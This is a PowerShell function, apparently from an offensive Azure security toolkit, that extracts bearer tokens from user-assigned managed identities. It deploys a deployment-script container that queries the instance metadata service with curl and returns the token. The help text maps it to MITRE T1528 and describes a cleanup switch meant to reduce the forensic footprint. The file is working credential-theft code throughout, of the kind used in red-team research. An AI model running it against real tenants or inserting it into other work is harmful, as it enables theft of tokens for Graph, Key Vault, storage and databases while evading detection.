function Get-ManagedIdentityToken {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = "ByResourceId")]
        [Alias('resource-id')]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceIdCompleter(
            "Microsoft.ManagedIdentity/userAssignedIdentities"
        )][string]$Id,

        [Parameter(Mandatory = $true,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = "ByName")]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceNameCompleterAttribute(
            "Microsoft.ManagedIdentity/userAssignedIdentities",
            "ResourceGroupName"
        )]
        [Alias('identity-name', 'user-assigned-identity')]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceGroupCompleterAttribute()]
        [Alias('rg', 'resource-group')]
        [string]$ResourceGroupName,

        [Parameter(Mandatory = $false)]
        [ValidateSet(
            'https://management.azure.com/',
            'https://graph.microsoft.com/',
            'https://vault.azure.net/',
            'https://storage.azure.com/',
            'https://database.windows.net/',
            'https://ossrdbms-aad.database.windows.net/'
        )]
        [Alias('audience', 'aud')]
        [string]$Resource = 'https://management.azure.com/',

        [Parameter(Mandatory = $false)]
        [string]$Location = 'eastus',

        [Parameter(Mandatory = $false)]
        [Alias('script-name')]
        [string]$DeploymentScriptName,

        [Parameter(Mandatory = $false)]
        [switch]$Decode,

        [Parameter(Mandatory = $false)]
        [switch]$Cleanup,

        [Parameter(Mandatory = $false)]
        [ValidateSet("Object", "JSON", "CSV", "Table")]
        [Alias("output", "o")]
        [string]$OutputFormat = "Object"
    )

    begin {
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat

        $startTime = Get-Date
        $apiVersion = '2023-08-01'

        if (-not $DeploymentScriptName) {
            $suffix = -join ((97..122) |
                Get-Random -Count 8 |
                ForEach-Object { [char]$_ })
            $DeploymentScriptName = 'ds-{0}' -f $suffix
        }
    }

    process {
        try {
            Write-Host "Extracting Managed Identity token..." -ForegroundColor Green

            # Resolve identity by name if needed
            if ($Name -and -not $Id) {
                Write-Host "  Resolving identity by name: $Name" -ForegroundColor Cyan
                $uami = Get-ManagedIdentity `
                    -Name $Name -OutputFormat Object
                if (-not $uami) {
                    Write-Message `
                        -FunctionName $MyInvocation.MyCommand.Name `
                        -Message "Managed Identity not found: $Name" `
                        -Severity 'Error'
                    return
                }
                $Id = $uami.id
                $clientId = $uami.properties.clientId
                $uamiName = $uami.name
                Write-Host "    Resolved: $uamiName ($clientId)" -ForegroundColor Green
            }
            elseif ($Id) {
                $uamiName = ($Id -split '/')[-1]
                Write-Host "  Resolving identity by resource ID: $uamiName" -ForegroundColor Cyan
                $identities = Invoke-AzBatch `
                    -ResourceType 'Microsoft.ManagedIdentity/userAssignedIdentities'
                $match = $identities |
                    Where-Object { $_.id -eq $Id }
                if (-not $match) {
                    Write-Message `
                        -FunctionName $MyInvocation.MyCommand.Name `
                        -Message "Managed Identity not found: $Id" `
                        -Severity 'Error'
                    return
                }
                $clientId = $match.properties.clientId
                Write-Host "    Resolved: $uamiName ($clientId)" -ForegroundColor Green
            }

            Write-Host "  Target audience: $Resource" -ForegroundColor Cyan
            Write-Verbose "Target UAMI: $uamiName ($clientId)"
            Write-Verbose "Resource audience: $Resource"

            # Bash inline script — curl + jq on AzureCLI
            # container is significantly faster than
            # AzurePowerShell (skips PS + Az module bootstrap)
            $imdsUrl = 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource={0}&client_id={1}' -f $Resource, $clientId
            $inlineScript = @"
response=`$(curl -s -H Metadata:true "$imdsUrl")
echo `$response | jq '{accessToken: .access_token, expiresOn: .expires_on, resource: .resource, tokenType: .token_type}' > `$AZ_SCRIPTS_OUTPUT_PATH
"@

            $payload = @{
                location   = $Location
                identity   = @{
                    type                   = 'UserAssigned'
                    userAssignedIdentities = @{
                        $Id = @{}
                    }
                }
                kind       = 'AzureCLI'
                properties = @{
                    azCliVersion      = '2.68.0'
                    scriptContent     = $inlineScript
                    retentionInterval = 'PT1H'
                    timeout           = 'PT5M'
                    cleanupPreference = 'OnSuccess'
                }
            } | ConvertTo-Json -Depth 10

            $armBase = $script:SessionVariables.armUri
            $subscriptionId = $script:SessionVariables.subscriptionId
            $deployUri = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Resources/deploymentScripts/{3}?api-version={4}' `
                -f $armBase, $subscriptionId, $ResourceGroupName, $DeploymentScriptName, $apiVersion

            Write-Host "  Deploying script: $DeploymentScriptName ($Location)" -ForegroundColor Cyan
            Write-Verbose "Deploying script: $DeploymentScriptName"

            $requestParam = @{
                Headers     = $script:authHeader
                Uri         = $deployUri
                Method      = 'PUT'
                Body        = $payload
                ContentType = 'application/json'
                UserAgent   = $script:SessionVariables.userAgent
            }
            $null = Invoke-RestMethod @requestParam

            # Poll for completion
            $statusParam = @{
                Headers   = $script:authHeader
                Uri       = $deployUri
                Method    = 'GET'
                UserAgent = $script:SessionVariables.userAgent
            }

            Write-Host "  Waiting for deployment completion..." -ForegroundColor Yellow
            $maxAttempts = 60
            $pollInterval = 5
            $lastState = ''
            $pollStart = Get-Date
            for ($i = 1; $i -le $maxAttempts; $i++) {
                Start-Sleep -Seconds $pollInterval
                $status = Invoke-RestMethod @statusParam
                $state = $status.properties.provisioningState
                $elapsed = [int]((Get-Date) - $pollStart).TotalSeconds

                if ($state -ne $lastState) {
                    Write-Host ('    [{0}s] State: {1}' -f $elapsed, $state) -ForegroundColor Blue
                    $lastState = $state
                }
                Write-Verbose ('Attempt {0}/{1} ({2}s) — State: {3}' -f $i, $maxAttempts, $elapsed, $state)

                if ($state -eq 'Succeeded') { break }
                if ($state -in 'Failed', 'Canceled') {
                    $errMsg = $status.properties.status.error.message
                    Write-Message `
                        -FunctionName $MyInvocation.MyCommand.Name `
                        -Message ('Deployment {0} after {1}s: {2}' -f $state.ToLower(), $elapsed, $errMsg) `
                        -Severity 'Error'
                    return
                }
            }

            if ($state -ne 'Succeeded') {
                $totalWait = [int]((Get-Date) - $pollStart).TotalSeconds
                
                Write-Host "    Deployment did not complete successfully" -ForegroundColor Red
                Write-Host ("    Final state: {0} (after {1}s)" -f $state, $totalWait) -ForegroundColor Yellow
                Write-Host "    Troubleshooting steps:" -ForegroundColor Cyan
                Write-Host "    1. Check Azure Portal for the deployment script:" -ForegroundColor White
                Write-Host ("       Resource Group: {0}" -f $ResourceGroupName) -ForegroundColor White
                Write-Host ("       Name: {0}" -f $DeploymentScriptName) -ForegroundColor White
                Write-Host "    2. Common causes:" -ForegroundColor White
                Write-Host "       - Azure Container Instances capacity exhausted in region" -ForegroundColor Gray
                Write-Host "       - ACI quota limits reached on subscription" -ForegroundColor Gray
                Write-Host ("       - Region '{0}' may have temporary capacity issues" -f $Location) -ForegroundColor Gray
                Write-Host "    3. Try alternative region: -Location 'westus' or 'northeurope'" -ForegroundColor White
                Write-Host "    4. Check ACI quota: az container list --query '[].location' -o tsv | sort | uniq -c" -ForegroundColor White
                
                # Try to get logs for diagnostics
                try {
                    $logsUri = '{0}/logs?api-version={1}' -f $deployUri, $apiVersion
                    $logs = Invoke-RestMethod `
                        -Uri $logsUri `
                        -Headers $script:authHeader `
                        -Method GET `
                        -UserAgent $script:SessionVariables.userAgent `
                        -ErrorAction SilentlyContinue
                    if ($logs.value) {
                        Write-Host "    Container logs:" -ForegroundColor Cyan
                        Write-Host ("       {0}" -f $logs.value) -ForegroundColor Gray
                    }
                }
                catch {
                    Write-Verbose "Could not retrieve container logs: $_"
                }
                
                Write-Message `
                    -FunctionName $MyInvocation.MyCommand.Name `
                    -Message (
                        'Deployment timed out after {0}s in state: {1}. ' +
                        'ACI provisioning likely delayed by capacity/quota. Try different region.' -f
                        $totalWait, $state
                    ) `
                    -Severity 'Error'
                return
            }

            # Extract token from outputs
            Write-Host "  Extracting token from deployment outputs..." -ForegroundColor Cyan
            $outputs = $status.properties.outputs
            if (-not $outputs -or -not $outputs.accessToken) {
                Write-Message `
                    -FunctionName $MyInvocation.MyCommand.Name `
                    -Message 'No token found in deployment outputs' `
                    -Severity 'Error'
                return
            }
            Write-Host "    Token extracted successfully" -ForegroundColor Green

            $tokenResult = [PSCustomObject]@{
                Identity    = $uamiName
                ClientId    = $clientId
                Resource    = $outputs.resource
                TokenType   = $outputs.tokenType
                AccessToken = $outputs.accessToken
                ExpiresOn   = [DateTimeOffset]::FromUnixTimeSeconds(
                    [long]$outputs.expiresOn
                ).DateTime.ToString('yyyy-MM-dd HH:mm:ss')
            }

            if ($Decode) {
                Write-Host "  Decoding JWT token..." -ForegroundColor Cyan
                try {
                    $decoded = ConvertFrom-JWT -Base64JWT $outputs.accessToken
                    $tokenResult | Add-Member `
                        -NotePropertyName 'DecodedToken' `
                        -NotePropertyValue $decoded
                    Write-Host "    Audience: $($decoded.aud)" -ForegroundColor White
                    Write-Host "    Object ID: $($decoded.oid)" -ForegroundColor White
                }
                catch {
                    Write-Warning "Failed to decode token: $($_.Exception.Message)"
                }
            }

            # Cleanup the deployment script resource
            if ($Cleanup) {
                Write-Host "  Cleaning up deployment script..." -ForegroundColor Yellow
                try {
                    $deleteParam = @{
                        Headers   = $script:authHeader
                        Uri       = $deployUri
                        Method    = 'DELETE'
                        UserAgent = $script:SessionVariables.userAgent
                    }
                    $null = Invoke-RestMethod @deleteParam
                    Write-Host "    Deployment script deleted" -ForegroundColor Green
                }
                catch {
                    Write-Warning "Cleanup failed: $($_.Exception.Message)"
                }
            }
        }
        catch {
            Write-Message `
                -FunctionName $MyInvocation.MyCommand.Name `
                -Message $_.Exception.Message `
                -Severity 'Error'
        }
    }

    end {
        $duration = (Get-Date) - $startTime

        Write-Host "`nManaged Identity Token Summary:" -ForegroundColor Magenta
        if ($tokenResult) {
            Write-Host "   Identity: $($tokenResult.Identity)" -ForegroundColor White
            Write-Host "   Client ID: $($tokenResult.ClientId)" -ForegroundColor White
            Write-Host "   Resource: $($tokenResult.Resource)" -ForegroundColor White
            Write-Host "   Expires: $($tokenResult.ExpiresOn)" -ForegroundColor Yellow
            Write-Host "   Token Length: $($tokenResult.AccessToken.Length) chars" -ForegroundColor White
            if ($Cleanup) {
                Write-Host "   Cleanup: Completed" -ForegroundColor Green
            }
        }
        else {
            Write-Host "   Status: No token retrieved" -ForegroundColor Red
        }
        Write-Host "   Duration: $($duration.TotalSeconds.ToString('F2')) seconds" -ForegroundColor White

        Write-Verbose "Completed function $($MyInvocation.MyCommand.Name)"

        if ($tokenResult) {
            Format-BlackCatOutput `
                -Data $tokenResult `
                -OutputFormat $OutputFormat `
                -FunctionName $MyInvocation.MyCommand.Name
        }
    }

    <#
    .SYNOPSIS
        Extracts a bearer token from a user-assigned Managed Identity.

    .DESCRIPTION
        Deploys an Azure Deployment Script resource
        (Microsoft.Resources/deploymentScripts) using the
        AzureCLI kind with a bash inline script. The container
        uses curl to call the Instance Metadata Service (IMDS)
        endpoint to obtain a bearer token for a specified
        resource audience, then writes it via jq to the
        deployment script output path.

        This technique enables token extraction from any UAMI
        the caller can reference, even without direct credential
        access to the identity itself. Requires Contributor
        (or equivalent) on the target resource group.

    .PARAMETER Id
        Full ARM resource ID of the user-assigned Managed
        Identity. Mutually exclusive with -Name.
        Aliases: resource-id

    .PARAMETER Name
        Display name of the user-assigned Managed Identity.
        Resolved via Get-ManagedIdentity. Mutually exclusive
        with -Id.
        Aliases: identity-name, user-assigned-identity

    .PARAMETER ResourceGroupName
        Resource group where the deployment script is created.
        The caller needs write permissions on this group.

    .PARAMETER Resource
        Token audience / resource URI. Determines which API
        the token will be valid for. Supported values:
        - https://management.azure.com/ (default, ARM)
        - https://graph.microsoft.com/ (Microsoft Graph)
        - https://vault.azure.net/ (Key Vault)
        - https://storage.azure.com/ (Azure Storage)
        - https://database.windows.net/ (Azure SQL)
        - https://ossrdbms-aad.database.windows.net/

    .PARAMETER Location
        Azure region for the deployment script resource.
        Defaults to 'eastus'.

    .PARAMETER DeploymentScriptName
        Custom name for the deployment script resource.
        Defaults to a random name (ds-<8 chars>).

    .PARAMETER Decode
        Decodes the retrieved JWT using ConvertFrom-JWT
        and attaches it as DecodedToken.

    .PARAMETER Cleanup
        Deletes the deployment script resource after token
        extraction to reduce forensic footprint.

    .PARAMETER OutputFormat
        Output format: Object, JSON, CSV, or Table.
        Default is Object.

    .EXAMPLE
        Get-ManagedIdentityToken `
            -Name "uami-hr-automation" `
            -ResourceGroupName "rg-production" `
            -Cleanup

        Extracts ARM access token by UAMI name and cleans up.

    .EXAMPLE
        Get-ManagedIdentityToken `
            -Id "/subscriptions/.../userAssignedIdentities/myUAMI" `
            -ResourceGroupName "rg-production" `
            -Resource "https://graph.microsoft.com/" `
            -Decode

        Retrieves a Graph token by resource ID and decodes it.

    .EXAMPLE
        Get-ManagedIdentity -Name "myUAMI" |
            Get-ManagedIdentityToken `
                -ResourceGroupName "rg-prod" `
                -Resource "https://vault.azure.net/" `
                -OutputFormat JSON

        Pipes identity from Get-ManagedIdentity and exports
        Key Vault token to timestamped JSON file.

    .OUTPUTS
        [PSCustomObject]
        Returns objects with properties:
        - Identity: UAMI display name
        - ClientId: UAMI client ID
        - Resource: Token audience
        - TokenType: Bearer
        - AccessToken: The extracted bearer token
        - ExpiresOn: Token expiration timestamp
        - DecodedToken: Decoded JWT (when -Decode)

    .NOTES
        Author: BlackCat Security Framework
        Requires: ARM API access (Contributor on resource group)

        Required permissions:
        - Microsoft.Resources/deploymentScripts/write
        - Microsoft.ManagedIdentity/userAssignedIdentities/read

        Leverages: Microsoft.Resources/deploymentScripts
        (AzureCLI kind) with bash + curl for fast execution.

    .LINK
        MITRE ATT&CK Tactic: TA0006 - Credential Access
        https://attack.mitre.org/tactics/TA0006/

    .LINK
        MITRE ATT&CK Technique: T1528 - Steal Application Access Token
        https://attack.mitre.org/techniques/T1528/
    #>
}
